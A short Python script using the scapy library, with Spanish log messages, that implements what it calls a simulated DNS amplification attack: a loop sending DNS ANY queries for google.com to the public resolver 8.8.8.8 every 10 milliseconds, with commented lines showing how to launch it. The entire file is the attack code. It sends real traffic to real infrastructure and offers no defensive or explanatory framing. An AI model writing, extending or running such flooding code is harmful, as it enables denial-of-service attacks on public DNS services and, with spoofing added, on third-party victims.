import time
from scapy.all import IP, UDP, DNS, DNSQR, send

running = False

def attack():
    global running
    try:
        dnsServer = "8.8.8.8"
        targetDomain = "google.com"
        print(f"[INFO] Ataque DNS Amplification simulado contra {dnsServer} → {targetDomain}")
        while True:
            while running:
                dnsRequest = (
                    IP(dst=dnsServer) /
                    UDP(dport=53) /
                    DNS(rd=1, qd=DNSQR(qname=targetDomain, qtype=255))  # Use 255 for ANY
                )
                send(dnsRequest, verbose=False)
                time.sleep(0.01)
            time.sleep(1)
    except Exception as e:
        print(f"[ERROR] Error durante el ataque DNS: {e}")

# Example to start attack (uncomment to test)
# running = True
# attack()